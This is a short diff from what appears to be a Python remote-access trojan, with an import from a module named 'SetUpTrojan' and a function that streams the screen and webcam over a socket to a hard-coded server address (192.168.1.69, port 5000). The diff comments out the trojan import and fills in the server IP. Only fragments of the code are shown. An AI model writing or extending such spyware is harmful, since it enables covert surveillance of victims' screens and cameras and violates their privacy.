@@ -8,7 +8,7 @@ import cv2
 from moviepy.editor import VideoFileClip
 import os
 import yt_dlp
-from SetUpTrojan import load_ip_from_file
+#from SetUpTrojan import load_ip_from_file
 
 def stream_screen_and_camera(client_socket):
     cap = cv2.VideoCapture(0)
@@ -47,7 +47,7 @@ def stream_screen_and_camera(client_socket):
         client_socket.close()
 
 def main():
-    SERVER_IP = "your_ip"  # Замените на IP сервера
+    SERVER_IP = "192.168.1.69"  # Замените на IP сервера
     SERVER_PORT = 5000          # Порт сервера
 
     try:
